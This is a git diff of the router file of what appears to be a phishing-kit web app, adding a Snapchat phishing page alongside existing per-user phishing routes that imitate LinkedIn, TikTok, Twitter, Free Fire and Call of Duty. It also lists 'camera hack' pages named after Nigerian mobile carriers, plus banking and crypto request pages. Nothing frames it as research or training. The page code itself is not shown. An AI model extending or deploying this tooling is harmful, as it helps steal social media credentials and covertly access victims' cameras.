@@ -1,4 +1,3 @@
-
 import { Toaster } from "@/components/ui/toaster";
 import { Toaster as Sonner } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
@@ -29,12 +28,16 @@ import LinkedInPhishing from "./pages/phishing/LinkedIn";
 import TikTokPhishing from "./pages/phishing/TikTok";
 import FreeFirePhishing from "./pages/phishing/FreeFire";
 import CallOfDutyPhishing from "./pages/phishing/CallOfDuty";
+import SnapchatPhishing from "./pages/phishing/Snapchat";
 
 // Camera Hack Pages
 import MTNCameraHack from "./pages/camera/MTN";
 import AirtelCameraHack from "./pages/camera/Airtel";
 import GLOCameraHack from "./pages/camera/GLO";
 import NineMobileCameraHack from "./pages/camera/NineMobile";
+
+import Support from "./pages/Support";
+import RedeemCode from "./pages/RedeemCode";
 
 const queryClient = new QueryClient();
 
@@ -58,6 +61,8 @@ const App = () => (
           <Route path="/gpt" element={<GPT />} />
           <Route path="/banking-request" element={<BankingRequest />} />
           <Route path="/crypto-request" element={<CryptoRequest />} />
+          <Route path="/support" element={<Support />} />
+          <Route path="/redeem-code" element={<RedeemCode />} />
           <Route path="/admin" element={<Admin />} />
           
           {/* Phishing Pages */}
@@ -66,6 +71,7 @@ const App = () => (
           <Route path="/phishing/twitter/:userId" element={<TwitterPhishing />} />
           <Route path="/phishing/linkedin/:userId" element={<LinkedInPhishing />} />
           <Route path="/phishing/tiktok/:userId" element={<TikTokPhishing />} />
+          <Route path="/phishing/snapchat/:userId" element={<SnapchatPhishing />} />
           <Route path="/phishing/freefire/:userId" element={<FreeFirePhishing />} />
           <Route path="/phishing/callofduty/:userId" element={<CallOfDutyPhishing />} />
           
